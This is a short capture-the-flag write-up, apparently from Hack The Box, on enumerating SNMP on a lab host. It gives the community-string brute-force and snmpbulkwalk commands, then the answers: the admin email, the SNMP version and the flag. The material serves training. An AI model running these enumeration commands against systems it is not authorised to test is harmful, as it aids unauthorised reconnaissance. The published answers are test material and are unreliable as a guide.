### SNMP Exercise
 
IP: 10.129.42.195
 
---
 
### Question 1:
Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.
 
Knowing the IP, I brute force the community strings with snmpbrute.py from https://github.com/SECFORCE/SNMP-Brute.
 
```diff
+ $ python3 snmpbrute.py -t 10.129.42.195 -f /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt
```
 
	Identified Community strings
		0) 10.129.42.195   public (v1)(RO)
		1) 10.129.42.195   public (v2c)(RO)
 
Seeing that it's public, I then pass that to snmpbulkwalk, tee'ing it to a file to be quicker.
 
```diff
+ $ snmpbulkwalk -v2c -c public 10.129.42.195 -m all | tee snmp.out
```
 
Scouring the output, I can find the email address.
 
&#x1F6A9; found **devadmin@inlanefreight.htb**.
 
---
 
### Question 2:
What is the customized version of the SNMP server?
 
Continuing to scour the same snmp.out output, I find the customized version.
 
&#x1F6A9; found **InFreight SNMP v0.91**.
 
---
 
### Question 3:
Enumerate the custom script that is running on the system and submit its output as the answer.
 
Also in the same output, I find the custom script's output.
 
&#x1F6A9; found **HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}**.
